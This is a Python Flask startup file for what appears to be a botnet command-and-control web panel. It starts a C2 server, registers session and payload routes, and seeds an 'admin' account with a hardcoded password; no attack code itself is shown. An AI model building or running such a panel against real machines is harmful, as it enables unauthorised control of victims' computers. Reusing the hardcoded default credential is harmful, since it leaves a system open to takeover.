from flask import Flask
from web_gui.config import Config
from flask_bcrypt import generate_password_hash


# server generator
from botnet import server
from botnet import utils
c2 = server.C2(host=utils.local_ip())

def create_app():
    app = Flask(__name__,
                static_folder='static',
                template_folder='templates')

    app.config.from_object(Config)

    from botnet.models import db, login_manager, User
    
    db.init_app(app)
    login_manager.init_app(app)
    login_manager.login_view = 'users.login'
    
    from web_gui.routes.root import root
    from web_gui.routes.user.user import users
    # from web_gui.routes.api.files import files
    from web_gui.routes.api.session import session
    from web_gui.routes.api.payload import payload
    # from web_gui.routes.errors.errors import errors

    app.register_blueprint(root)
    app.register_blueprint(users)
    # app.register_blueprint(files)
    app.register_blueprint(session)
    app.register_blueprint(payload)
    # app.register_blueprint(errors)
    
    
    with app.app_context():
        db.create_all()
        
        if len(User.query.all()) == 0:
            hashed_password = generate_password_hash('T3st!@#$').decode('utf-8')
            user = User(username='admin', password=hashed_password)
            db.session.add(user)
            db.session.commit()
            print('user created')
        
    return app
